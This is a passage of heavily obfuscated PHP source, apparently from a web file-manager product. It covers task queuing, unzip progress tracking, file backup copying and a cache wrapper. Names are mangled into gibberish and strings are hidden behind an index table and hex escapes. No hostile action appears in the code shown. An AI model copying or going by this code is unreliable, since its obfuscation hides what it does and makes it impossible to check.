$this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¶²ÆÁÒÆ) { $ÑÅÚæùß =& $_SERVER[¹ş¤¶ĞÖ]; Cache::set($ÑÅÚæùß[1696] . $this->task[$ÑÅÚæùß[428]], $¶²ÆÁÒÆ, 60); return $¶²ÆÁÒÆ; } public static function get($Àì¡œÛ¼) { $÷Â¼‹Ãñ =& $_SERVER[¹ş¤¶ĞÖ]; $‚ûğ­òè = self::valueGet($Àì¡œÛ¼); if (is_array($‚ûğ­òè) && $‚ûğ­òè[$÷Â¼‹Ãñ[1700]]) { $°Öô¼ŒÄ = ActionApply($‚ûğ­òè[$÷Â¼‹Ãñ[1700]], array($‚ûğ­òè)); $‚ûğ­òè = is_array($°Öô¼ŒÄ) ? $°Öô¼ŒÄ : $‚ûğ­òè; } return $‚ûğ­òè; } public static function listData() { $ˆ¢ÄãÛ´ = self::valueGet(); return array_sort_by($ˆ¢ÄãÛ´, $_SERVER[¹ş¤¶ĞÖ][1680], !0); } public static function kill($¨´üÀìå) { return self::changeStatus($¨´üÀìå, self::STATYS_KILL); } public static function stop($±ÉùÂø) { return self::changeStatus($±ÉùÂø, self::STATYS_STOP); } public static function restart($ÜŠåÈ¬) { return self::changeStatus($ÜŠåÈ¬, self::STATYS_RUNNING); } public static function killAll() { $ìËëÇ·õ =& $_SERVER[¹ş¤¶ĞÖ]; $éœğä¼Ì = self::listData(); foreach ($éœğä¼Ì as $¡‚®½Èğ) { self::kill($¡‚®½Èğ[$ìËëÇ·õ[428]]); } sleep(2); foreach ($éœğä¼Ì as $¡‚®½Èğ) { self::valueSet($¡‚®½Èğ[$ìËëÇ·õ[428]], !1); } } private static function changeStatus($ú¶÷Š©ğ, $Âßˆüç­) { $¸¦ªÚÅ¹ =& $_SERVER[¹ş¤¶ĞÖ]; $ÙÔ¬Õô© = self::valueGet($ú¶÷Š©ğ); if (!$ÙÔ¬Õô©) { return !1; } $ÙÔ¬Õô©[$¸¦ªÚÅ¹[776]] = $Âßˆüç­; self::valueSet($ú¶÷Š©ğ, $ÙÔ¬Õô©); self::log($¸¦ªÚÅ¹[1701] . $ÙÔ¬Õô©[$¸¦ªÚÅ¹[428]] . $¸¦ªÚÅ¹[1702] . $Âßˆüç­); return !0; } public static function valueGet($Ò¾Îß„“ = false) { $ìø¸î¬ó =& $_SERVER[¹ş¤¶ĞÖ]; if ($Ò¾Îß„“) { $Ú·“¹ı€ = Model($ìø¸î¬ó[476])->where(array($ìø¸î¬ó[94] => $Ò¾Îß„“, $ìø¸î¬ó[33] => $ìø¸î¬ó[1104]))->find(); return $Ú·“¹ı€ ? json_decode($Ú·“¹ı€[$ìø¸î¬ó[403]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ğ§şí‚ = false) { $€üúºœ” =& $_SERVER[¹ş¤¶ĞÖ]; $ŠÙÆÄşˆ = array($€üúºœ”[33] => $€üúºœ”[1104]); if ($ğ§şí‚) { $ŠÙÆÄşˆ[$€üúºœ”[1676]] = $ğ§şí‚; } $õÂ¡Şë = Model($€üúºœ”[476])->where($ŠÙÆÄşˆ)->select(); $õÂ¡Şë = $õÂ¡Şë ? $õÂ¡Şë : array(); foreach ($õÂ¡Şë as $ÙÇàş·À => $‘Â±‘’Ï) { $õÂ¡Şë[$ÙÇàş·À] = json_decode($‘Â±‘’Ï[$€üúºœ”[403]], !0); } return $õÂ¡Şë; } public static function valueSet($‹œ÷ñïü, $ŞÒœ‰¦¥) { $üµ†·´â =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ŞÒœ‰¦¥) { return Model($üµ†·´â[476])->where(array($üµ†·´â[94] => $‹œ÷ñïü, $üµ†·´â[33] => $üµ†·´â[1104]))->delete(); } $¹°ÁÁ¦ = json_encode($ŞÒœ‰¦¥); if (!$¹°ÁÁ¦) { ob_start(); var_dump($ŞÒœ‰¦¥); $»™›æèŠ = ob_get_clean(); self::log($üµ†·´â[1703] . json_encode_force($»™›æèŠ)); } if (!$‹œ÷ñïü || !$ŞÒœ‰¦¥[$üµ†·´â[428]]) { return !1; } $‰½šö‰á = array($üµ†·´â[33] => $üµ†·´â[1104], $üµ†·´â[1676] => USER_ID, $üµ†·´â[94] => $‹œ÷ñïü, $üµ†·´â[403] => $¹°ÁÁ¦); $ã¿öŒ = $üµ†·´â[1704]; CacheLock::lock($ã¿öŒ); Model($üµ†·´â[476])->add($‰½šö‰á, array(), !0); CacheLock::unlock($ã¿öŒ); } public static function log($Êóê°œ) { if (!GLOBAL_DEBUG) { return; } write_log($Êóê°œ, $_SERVER[¹ş¤¶ĞÖ][1705]); } } goto F–ˆ§¦ËÀÃ; dñ¡‡Óéõ’: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\165\145\x75\145\x4c\x65\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\145\165\145\x44\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($ìË»ÔÇ, $æ‚×ŒÓˆ = array(), $Û‰öÃğ› = '', $£Ï‰ûş = '') { $Æ™û¸Àš =& $_SERVER[¹ş¤¶ĞÖ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($£Ï‰ûş && array_find_by_field(self::$listData, $Æ™û¸Àš[94], $£Ï‰ûş)) { return !0; } self::$listData[] = array($Æ™û¸Àš[293] => $ìË»ÔÇ, $Æ™û¸Àš[1774] => $æ‚×ŒÓˆ, $Æ™û¸Àš[482] => $Û‰öÃğ›, $Æ™û¸Àš[94] => $£Ï‰ûş); return !0; } public static function addSubmit() { $ŠîØ·ÑË =& $_SERVER[¹ş¤¶ĞÖ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ŠîØ·ÑË[1775] . json_encode_force(array_to_keyvalue(self::$listData, $ŠîØ·ÑË[12], $ŠîØ·ÑË[482])), $ŠîØ·ÑË[1776]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ÒƒéÊŸÃ, $„èŸ¹ØÏ = array(), $²ÈÎ­ = '', $‰í´È„¦ = '') { $ıû›Áä =& $_SERVER[¹ş¤¶ĞÖ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $à‰Ã‘Â = self::getAll(); if ($‰í´È„¦ && array_find_by_field($à‰Ã‘Â, $ıû›Áä[94], $‰í´È„¦)) { return !0; } $à‰Ã‘Â[] = array($ıû›Áä[293] => $ÒƒéÊŸÃ, $ıû›Áä[1774] => $„èŸ¹ØÏ, $ıû›Áä[482] => $²ÈÎ­, $ıû›Áä[94] => $‰í´È„¦); write_log($ıû›Áä[1775] . $²ÈÎ­, $ıû›Áä[1776]); self::setAll($à‰Ã‘Â); return !0; } public static function run() { $¯½Ñ²Šú =& $_SERVER[¹ş¤¶ĞÖ]; $È†ÌƒŠ = self::getAll(); $êÔªÌ²› = array_shift($È†ÌƒŠ); if (!$êÔªÌ²›) { return !1; } self::setAll($È†ÌƒŠ); $Ãë™€ÓÚ = timeFloat(); $·§·“Î = $¯½Ñ²Šú[12]; try { $·§·“Î = Hook::apply($êÔªÌ²›[$¯½Ñ²Šú[293]], $êÔªÌ²›[$¯½Ñ²Šú[1774]]); } catch (Exception $ÔÄÊ»¬¾) { } $‘„Í¾û¨ = number_format(timeFloat() - $Ãë™€ÓÚ, 3) . $¯½Ñ²Šú[1692]; if ($·§·“Î && is_string($·§·“Î)) { $‘„Í¾û¨ = $‘„Í¾û¨ . $¯½Ñ²Šú[1777] . $·§·“Î; } write_log($¯½Ñ²Šú[1778] . $êÔªÌ²›[$¯½Ñ²Šú[482]] . $¯½Ñ²Šú[1779] . $‘„Í¾û¨, $¯½Ñ²Šú[1776]); return !0; } public static function count() { $Ã§Ù¶‹ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Ã§Ù¶‹) { return 0; } return intval($Ã§Ù¶‹); } public static function getAll() { $™öÍÈÜÎ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$™öÍÈÜÎ) { return array(); } return $™öÍÈÜÎ; } public static function setAll($ÎÎÓ©¨Ö) { $ïı“ËŠ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÎÎÓ©¨Ö), $ïı“ËŠ); Cache::set(self::QUEUE_DATA, $ÎÎÓ©¨Ö, $ïı“ËŠ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ıªÕ¨ˆ, $ÌÓ¯¢‡ = 5.0) { if (!$ıªÕ¨ˆ) { return; } $æÀàŸ¢Ì = Cache::get($ıªÕ¨ˆ); if (!$æÀàŸ¢Ì || timeFloat() - floatVal($æÀàŸ¢Ì) >= $ÌÓ¯¢‡) { Cache::set($ıªÕ¨ˆ, timeFloat(), $ÌÓ¯¢‡ * 10); return !0; } return !1; } public static function timeLimitCall($À™Ò¿, $‡©û·ÍÉ, $âÜÖ¥©¥, $“¹ÈÅ¥“ = 5.0) { $½şÓôè =& $_SERVER[¹ş¤¶ĞÖ]; if (!$À™Ò¿ || !$‡©û·ÍÉ) { return; } self::$asyncAdd = !0; $Ì¡›‘æƒ = $½şÓôè[1780]; $…ì‡ş‹ò = Cache::get($Ì¡›‘æƒ, !0); $üØ‚ÑÕº = array($½şÓôè[1781] => timeFloat(), $½şÓôè[1782] => timeFloat(), $½şÓôè[293] => $‡©û·ÍÉ, $½şÓôè[1774] => $âÜÖ¥©¥, $½şÓôè[180] => $“¹ÈÅ¥“); if (is_array($…ì‡ş‹ò[$À™Ò¿])) { $üØ‚ÑÕº[$½şÓôè[1782]] = $…ì‡ş‹ò[$À™Ò¿][$½şÓôè[1782]]; } if (is_array($…ì‡ş‹ò[$À™Ò¿])) { if (timeFloat() - $…ì‡ş‹ò[$À™Ò¿][$½şÓôè[1781]] < $üØ‚ÑÕº[$½şÓôè[180]] * 0.3) { return; } $üØ‚ÑÕº[$½şÓôè[1782]] = $…ì‡ş‹ò[$À™Ò¿][$½şÓôè[1782]]; } $…ì‡ş‹ò[$À™Ò¿] = $üØ‚ÑÕº; Cache::set($Ì¡›‘æƒ, $…ì‡ş‹ò, 60); Cache::removeMemory($Ì¡›‘æƒ); write_log($½şÓôè[1783] . $À™Ò¿ . $½şÓôè[71] . $‡©û·ÍÉ, $½şÓôè[1776]); } public static function timeLimitCallLoop() { $”ßª™ê¬ =& $_SERVER[¹ş¤¶ĞÖ]; $ßîŒûû‡ = array($”ßª™ê¬[1784]); $ÃÏÜ”’ò = in_array(strtolower(ACTION), $ßîŒûû‡); if (!$ÃÏÜ”’ò && !self::$asyncAdd) { return; } $È¾™Öåä = $”ßª™ê¬[1780]; $ôğ•µà… = Cache::get($È¾™Öåä, !0); if (!$ôğ•µà… || count($ôğ•µà…) <= 0) { return; } $¶Õ¨“áœ = !1; $›šÔ‰ˆ“ = timeFloat(); $â²¯®î¾ = array(); foreach ($ôğ•µà… as $ÎãŸÍ´™ => $„î×½Å¢) { if ($›šÔ‰ˆ“ - $„î×½Å¢[$”ßª™ê¬[1782]] > $„î×½Å¢[$”ßª™ê¬[180]]) { $¶Õ¨“áœ = !0; try { Hook::apply($„î×½Å¢[$”ßª™ê¬[293]], $„î×½Å¢[$”ßª™ê¬[1774]]); write_log($”ßª™ê¬[1785] . $ÎãŸÍ´™ . $”ßª™ê¬[71] . $„î×½Å¢[$”ßª™ê¬[293]] . $”ßª™ê¬[1786] . ACTION, $”ßª™ê¬[1776]); } catch (Exception $Â“²’€) { } continue; } $â²¯®î¾[$ÎãŸÍ´™] = $„î×½Å¢; } if (!$¶Õ¨“áœ) { return; } if (!$â²¯®î¾) { return Cache::remove($È¾™Öåä); } Cache::set($È¾™Öåä, $â²¯®î¾, 60); Cache::removeMemory($È¾™Öåä); } public static function finished($øÆ‘û¥, $˜û¦Áİş) { $ËÊ·µû =& $_SERVER[¹ş¤¶ĞÖ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ËÊ·µû[293] => $øÆ‘û¥, $ËÊ·µû[1774] => $˜û¦Áİş); } private static function finishedRun() { $Æà“ÅÅ¦ =& $_SERVER[¹ş¤¶ĞÖ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ê¼îğÔÅ) { try { Hook::apply($ê¼îğÔÅ[$Æà“ÅÅ¦[293]], $ê¼îğÔÅ[$Æà“ÅÅ¦[1774]]); } catch (Exception $Äæ­•¸) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $å¨ĞĞú€ =& $_SERVER[¹ş¤¶ĞÖ]; parent::startAfter(); Hook::bind($å¨ĞĞú€[1787], array($this, $å¨ĞĞú€[1788])); Hook::bind($å¨ĞĞú€[1226], array($this, $å¨ĞĞú€[1789])); $šµôÛ¾ =& $this->task; $šµôÛ¾[$å¨ĞĞú€[1790]] = $å¨ĞĞú€[1227]; if (!$šµôÛ¾[$å¨ĞĞú€[1574]]) { $šµôÛ¾[$å¨ĞĞú€[1574]] = LNG($å¨ĞĞú€[1791]); } } protected function endAfter() { $Öù¡îí =& $_SERVER[¹ş¤¶ĞÖ]; parent::endAfter(); Hook::unbind($Öù¡îí[1787], array($this, $Öù¡îí[1788])); Hook::unbind($Öù¡îí[1226], array($this, $Öù¡îí[1789])); } public function updateAfter() { $«Ÿ¦î«š =& $_SERVER[¹ş¤¶ĞÖ]; $Â¾ÌÚåÒ =& $this->task; if (!$Â¾ÌÚåÒ[$«Ÿ¦î«š[812]] || !$Â¾ÌÚåÒ[$«Ÿ¦î«š[789]]) { return; } if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1790]] == $«Ÿ¦î«š[1227]) { $¹³•ı† = 0; if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1729]]) { $¹³•ı† = $Â¾ÌÚåÒ[$«Ÿ¦î«š[1730]] / $Â¾ÌÚåÒ[$«Ÿ¦î«š[1729]]; } $Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]] = $¹³•ı† * 0.3; } else { if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1790]] == $«Ÿ¦î«š[342]) { $¹³•ı† = $Â¾ÌÚåÒ[$«Ÿ¦î«š[1677]] / $Â¾ÌÚåÒ[$«Ÿ¦î«š[812]]; $Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]] = 0.3 + $¹³•ı† * 0.4; } else { if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1790]] == $«Ÿ¦î«š[107]) { $¢¡¹¹¢† = 0; if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1731]] == $«Ÿ¦î«š[107]) { $¢¡¹¹¢† = $Â¾ÌÚåÒ[$«Ÿ¦î«š[1730]]; } $¹³•ı† = ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1734]] + $¢¡¹¹¢†) / $Â¾ÌÚåÒ[$«Ÿ¦î«š[789]]; $Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]] = 0.3 + 0.4 + $¹³•ı† * 0.3; } } } if ($Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]] > 0) { $˜™¹”ÆØ = timeFloat() - $Â¾ÌÚåÒ[$«Ÿ¦î«š[1680]] - $Â¾ÌÚåÒ[$«Ÿ¦î«š[1683]]; $Â¾ÌÚåÒ[$«Ÿ¦î«š[1684]] = $˜™¹”ÆØ * (1 - $Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]]) / $Â¾ÌÚåÒ[$«Ÿ¦î«š[1678]]; } } public function addFile($ó“ş§¤í) { $ˆé§ñÚİ =& $_SERVER[¹ş¤¶ĞÖ]; $Í‚½î±é =& $this->task; $îš²àÀ­ = IO::info($ó“ş§¤í); $Í‚½î±é[$ˆé§ñÚİ[1727]] = $îš²àÀ­[$ˆé§ñÚİ[32]]; $Í‚½î±é[$ˆé§ñÚİ[1729]] = $îš²àÀ­[$ˆé§ñÚİ[76]]; $Í‚½î±é[$ˆé§ñÚİ[1730]] = 0; $Í‚½î±é[$ˆé§ñÚİ[1097]] = $ˆé§ñÚİ[1750]; $Í‚½î±é[$ˆé§ñÚİ[1731]] = $ˆé§ñÚİ[1227]; $Í‚½î±é[$ˆé§ñÚİ[789]] = $îš²àÀ­[$ˆé§ñÚİ[76]]; $Í‚½î±é[$ˆé§ñÚİ[812]] = 1; $ş•ù¯ = 0; $Í‚½î±é[$ˆé§ñÚİ[1738]] = array($ˆé§ñÚİ[1739] => $ş•ù¯ + 1, $ˆé§ñÚİ[449] => $îš²àÀ­[$ˆé§ñÚİ[32]], $ˆé§ñÚİ[84] => $îš²àÀ­[$ˆé§ñÚİ[84]], $ˆé§ñÚİ[538] => $îš²àÀ­[$ˆé§ñÚİ[538]] ? $îš²àÀ­[$ˆé§ñÚİ[538]] : $îš²àÀ­[$ˆé§ñÚİ[84]]); $this->update(); } public function unzipAfter($­ÑÜœ‰) { $—íª‚¿¤ =& $_SERVER[¹ş¤¶ĞÖ]; $ßò¡Åæ¿ =& $this->task; $ßò¡Åæ¿[$—íª‚¿¤[1790]] = $—íª‚¿¤[107]; $ğŠğ¸ï˜ = IO::infoWithChildren($­ÑÜœ‰); $Ç££– = 0; $ßò¡Åæ¿[$—íª‚¿¤[1738]] = array($—íª‚¿¤[1739] => $Ç££– + 1, $—íª‚¿¤[449] => $ğŠğ¸ï˜[$—íª‚¿¤[32]], $—íª‚¿¤[84] => $ğŠğ¸ï˜[$—íª‚¿¤[84]], $—íª‚¿¤[538] => $ğŠğ¸ï˜[$—íª‚¿¤[538]] ? $ğŠğ¸ï˜[$—íª‚¿¤[538]] : $ğŠğ¸ï˜[$—íª‚¿¤[84]]); if ($ğŠğ¸ï˜[$—íª‚¿¤[33]] == $—íª‚¿¤[200]) { $ßò¡Åæ¿[$—íª‚¿¤[812]] = 1; } else { $ßò¡Åæ¿[$—íª‚¿¤[812]] = $ğŠğ¸ï˜[$—íª‚¿¤[79]][$—íª‚¿¤[77]]; } $ßò¡Åæ¿[$—íª‚¿¤[1097]] = $—íª‚¿¤[12]; $ßò¡Åæ¿[$—íª‚¿¤[1731]] = 0; $ßò¡Åæ¿[$—íª‚¿¤[1677]] = 0; $ßò¡Åæ¿[$—íª‚¿¤[1729]] = 0; $ßò¡Åæ¿[$—íª‚¿¤[1730]] = 0; $ßò¡Åæ¿[$—íª‚¿¤[1727]] = $—íª‚¿¤[12]; $ßò¡Åæ¿[$—íª‚¿¤[1734]] = 0; $ßò¡Åæ¿[$—íª‚¿¤[789]] = $ğŠğ¸ï˜[$—íª‚¿¤[76]]; $this->update(); self::log($—íª‚¿¤[1792] . json_encode(array($ßò¡Åæ¿, $ğŠğ¸ï˜))); } public function nameParse($øÚãÜúß) { $‡ƒËî·› =& $_SERVER[¹ş¤¶ĞÖ]; $ôÕ‹äß =& $this->task; if ($ôÕ‹äß[$‡ƒËî·›[1790]] == $‡ƒËî·›[1227]) { $ôÕ‹äß[$‡ƒËî·›[1790]] = $‡ƒËî·›[342]; $ôÕ‹äß[$‡ƒËî·›[1734]] = 0; $ôÕ‹äß[$‡ƒËî·›[789]] = 0; } $—¿úÕÑ¼ = get_path_this($øÚãÜúß); if (strstr($—¿úÕÑ¼, $‡ƒËî·›[10])) { $ôÕ‹äß[$‡ƒËî·›[1677]] += 1; $ôÕ‹äß[$‡ƒËî·›[812]] += 1; } $ôÕ‹äß[$‡ƒËî·›[1727]] = $øÚãÜúß; $this->update(); } } goto d¼¹Ø ¨‡¿; aÆÜ†‡â ¯: class BackupFile { public function __construct() { } public function index() { $ÒÉÒçıÁ = Backup::get(); $€š¯·Ÿó = $ÒÉÒçıÁ[$_SERVER[¹ş¤¶ĞÖ][322]][$_SERVER[¹ş¤¶ĞÖ][200]][$_SERVER[¹ş¤¶ĞÖ][497]]; $íıíèõ = array($_SERVER[¹ş¤¶ĞÖ][498] => array($_SERVER[¹ş¤¶ĞÖ][833], $€š¯·Ÿó), $_SERVER[¹ş¤¶ĞÖ][834] => array($_SERVER[¹ş¤¶ĞÖ][360], $ÒÉÒçıÁ[$_SERVER[¹ş¤¶ĞÖ][777]])); $Õ¡‰øÑã = (int) Model($_SERVER[¹ş¤¶ĞÖ][815])->where($íıíèõ)->count($_SERVER[¹ş¤¶ĞÖ][497]); $·…£³«é = (int) Model($_SERVER[¹ş¤¶ĞÖ][815])->where($íıíèõ)->sum($_SERVER[¹ş¤¶ĞÖ][76]); $Ç’¬¢‹ğ = new TaskFileTransfer($_SERVER[¹ş¤¶ĞÖ][835], $_SERVER[¹ş¤¶ĞÖ][806], $Õ¡‰øÑã, LNG($_SERVER[¹ş¤¶ĞÖ][807]) . $_SERVER[¹ş¤¶ĞÖ][808] . LNG($_SERVER[¹ş¤¶ĞÖ][836])); $Ç’¬¢‹ğ->task[$_SERVER[¹ş¤¶ĞÖ][789]] = $·…£³«é; $à®§¤öƒ = array($_SERVER[¹ş¤¶ĞÖ][837] => $Õ¡‰øÑã, $_SERVER[¹ş¤¶ĞÖ][838] => $·…£³«é, $_SERVER[¹ş¤¶ĞÖ][839] => time()); Backup::set($à®§¤öƒ); $™æ°”—Á = !0; $º¾î¸úĞ = $this->storeIds(); $½†—ÎÆŞ = 1; $Ëß’´ÛÏ = 1000; $ù“ÔÏú‘ = $Ññ‡ŞËÊ = 0; $½ŸĞÃ¼µ = array(); $îƒª²³¥ = $€ÙÀ¶½Ÿ = 0; do { $˜éÔî÷ = $_SERVER[¹ş¤¶ĞÖ][840]; $äôµŸ­´ = Model($_SERVER[¹ş¤¶ĞÖ][815])->where($íıíèõ)->field($˜éÔî÷)->order($_SERVER[¹ş¤¶ĞÖ][841])->selectPage($Ëß’´ÛÏ, $½†—ÎÆŞ); $æª¡Ú²À = !empty($äôµŸ­´[$_SERVER[¹ş¤¶ĞÖ][398]]) ? $äôµŸ­´[$_SERVER[¹ş¤¶ĞÖ][398]] : array(); foreach ($æª¡Ú²À as $á¸–Âü) { if (!$this->_fileExist($á¸–Âü, $½ŸĞÃ¼µ, $º¾î¸úĞ)) { $Õ¡‰øÑã -= 1; $·…£³«é -= (int) $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][76]]; write_log("\146\151\154\x65\40\x6e\157\x74\x20\145\x78\151\163\x74\56\x66\x69\x6c\145\x49\104\72{$á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][497]]}\x2c\x20\160\141\164\150\72{$á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][84]]}", $_SERVER[¹ş¤¶ĞÖ][842]); continue; } $´’´š•ù = $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][84]]; $âö·úæÍ = "\173\x69\x6f\72{$ÒÉÒçıÁ[$_SERVER[¹ş¤¶ĞÖ][777]]}\175" . substr($´’´š•ù, strlen("\x7b\151\157\72{$á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][843]]}\175")); if (IO::exist($âö·úæÍ)) { $Ç’¬¢‹ğ->updateFileEnd($á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][32]], $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][76]]); } else { $âö·úæÍ = get_path_father($âö·úæÍ); IO::mkdir($âö·úæÍ); if (!IO::copy($´’´š•ù, $âö·úæÍ, $_SERVER[¹ş¤¶ĞÖ][844])) { write_log($_SERVER[¹ş¤¶ĞÖ][845] . $´’´š•ù . $_SERVER[¹ş¤¶ĞÖ][829] . $âö·úæÍ . $_SERVER[¹ş¤¶ĞÖ][164], $_SERVER[¹ş¤¶ĞÖ][806]); $™æ°”—Á = !1; break; } } $€š¯·Ÿó = $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][497]]; $Ññ‡ŞËÊ += 1; $ù“ÔÏú‘ += $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][76]]; $€ÙÀ¶½Ÿ += 1; $îƒª²³¥ += $á¸–Âü[$_SERVER[¹ş¤¶ĞÖ][76]]; if ($ù“ÔÏú‘ >= 1024 * 1024 * 100) { $à®§¤öƒ = array($_SERVER[¹ş¤¶ĞÖ][846] => $€š¯·Ÿó, $_SERVER[¹ş¤¶ĞÖ][847] => $€ÙÀ¶½Ÿ, $_SERVER[¹ş¤¶ĞÖ][848] => $îƒª²³¥); Backup::set($à®§¤öƒ); $ù“ÔÏú‘ = $Ññ‡ŞËÊ = 0; } } $ÎşÚŞµÂ = count($æª¡Ú²À); $½†—ÎÆŞ++; } while ($ÎşÚŞµÂ == $Ëß’´ÛÏ); $Ç’¬¢‹ğ->end(); $à®§¤öƒ = array($_SERVER[¹ş¤¶ĞÖ][849] => 1, $_SERVER[¹ş¤¶ĞÖ][787] => time(), $_SERVER[¹ş¤¶ĞÖ][801] => 1, $_SERVER[¹ş¤¶ĞÖ][846] => $€š¯·Ÿó, $_SERVER[¹ş¤¶ĞÖ][838] => $·…£³«é, $_SERVER[¹ş¤¶ĞÖ][837] => $Õ¡‰øÑã, $_SERVER[¹ş¤¶ĞÖ][850] => time()); if ($Ññ‡ŞËÊ) { $à®§¤öƒ[$_SERVER[¹ş¤¶ĞÖ][847]] = $€ÙÀ¶½Ÿ; $à®§¤öƒ[$_SERVER[¹ş¤¶ĞÖ][848]] = $îƒª²³¥; } Backup::set($à®§¤öƒ); $this->_fileFilter($½ŸĞÃ¼µ); return !0; } private function _fileExist($Ó˜éÅ¯ , &$Ê ½êÅğ, $Ë°›¦¨) { $‰Øò´à =& $_SERVER[¹ş¤¶ĞÖ]; $Ê“ñ´Ïü = $Ó˜éÅ¯ [$‰Øò´à[84]]; if (in_array($Ó˜éÅ¯ [$‰Øò´à[497]], $Ê ½êÅğ)) { return !1; } if (!in_array($Ó˜éÅ¯ [$‰Øò´à[843]], $Ë°›¦¨)) { return !1; } if (IO::exist($Ê“ñ´Ïü)) { return !0; } $×Õª£’­ = get_path_father($Ê“ñ´Ïü); if (IO::exist($×Õª£’­)) { $Ê ½êÅğ[] = $Ó˜éÅ¯ [$‰Øò´à[497]]; return !1; } $íÒ“–© = array($‰Øò´à[843] => $Ó˜éÅ¯ [$‰Øò´à[843]], $‰Øò´à[84] => array($‰Øò´à[412], "{$×Õª£’­}\45")); $Ú®şÈè´ = Model($‰Øò´à[815])->where($íÒ“–©)->field($‰Øò´à[498])->select(); $Ê ½êÅğ = array_merge($Ê ½êÅğ, array_to_keyvalue($Ú®şÈè´, $‰Øò´à[12], $‰Øò´à[497])); return !1; } private function _fileFilter($³ÍœÇäŸ) { $ğ“á…¬ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($³ÍœÇäŸ)) { return; } $É²ñ’‰ = array($ğ“á…¬[497] => array($ğ“á…¬[7], array_unique($³ÍœÇäŸ))); $‚ìØ¡À = Model($ğ“á…¬[851])->where($É²ñ’‰)->field($ğ“á…¬[431])->select(); foreach ($‚ìØ¡À as $£ƒ¤ãòµ) { Model($ğ“á…¬[851])->remove($£ƒ¤ãòµ[$ğ“á…¬[431]], !1); } } private function storeIds() { $€­Ü³Õ =& $_SERVER[¹ş¤¶ĞÖ]; $¢ûîö• = Model($€­Ü³Õ[793])->listData(); $ñı’¤„ = array(); $Ÿñ¨ˆûµ = $GLOBALS[$€­Ü³Õ[6]][$€­Ü³Õ[89]][$€­Ü³Õ[852]]; foreach ($¢ûîö• as $æ€‹á³) { $àÖŸÌƒç = strtolower($æ€‹á³[$€­Ü³Õ[95]]); if (!isset($Ÿñ¨ˆûµ[$àÖŸÌƒç])) { continue; } $£® ˜Ü = $€­Ü³Õ[74] . (isset($Ÿñ¨ˆûµ[$àÖŸÌƒç]) ? $Ÿñ¨ˆûµ[$àÖŸÌƒç] : ucfirst($àÖŸÌƒç)); if (!class_exists($£® ˜Ü)) { continue; } $ñı’¤„[] = $æ€‹á³[$€­Ü³Õ[428]]; } return $ñı’¤„; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $·µ°Óóí =& $_SERVER[¹ş¤¶ĞÖ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $–’Š€İ = $GLOBALS[$·µ°Óóí[6]][$·µ°Óóí[378]]; $·©Ò†–â = $–’Š€İ[$–’Š€İ[$·µ°Óóí[853]]]; $ÇÎ„¥„ö = $–’Š€İ[$·µ°Óóí[854]]; switch ($–’Š€İ[$·µ°Óóí[853]]) { case $·µ°Óóí[21]: self::$handle = Model($·µ°Óóí[855]); break; case $·µ°Óóí[856]: self::$handle = new CacheRedis($·©Ò†–â, $ÇÎ„¥„ö); break; case $·µ°Óóí[857]: self::$handle = new CacheMemcached($·©Ò†–â, $ÇÎ„¥„ö); break; case $·µ°Óóí[200]: self::$handle = new CacheFile($·©Ò†–â, $ÇÎ„¥„ö); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($™Ğƒ®åº) { if (is_array($™Ğƒ®åº) || is_object($™Ğƒ®åº)) { $™Ğƒ®åº = json_encode($™Ğƒ®åº); } $™Ğƒ®åº = rawurlencode($™Ğƒ®åº); return md5(KOD_SITE_ID . $_SERVER[¹ş¤¶ĞÖ][11] . $™Ğƒ®åº); } public static function get($¤ Î‘Ë—, $‘ÁØÔØ = false) { $ÖÂÀùÔ = self::key($¤ Î‘Ë—); if ($‘ÁØÔØ) { return unserialize(self::init()->get($ÖÂÀùÔ)); } if (!isset(self::$memoryCache[$ÖÂÀùÔ])) { $¯ÇÜÊıÈ = self::init()->get($ÖÂÀùÔ); self::$memoryCache[$ÖÂÀùÔ] = unserialize($¯ÇÜÊıÈ); } return 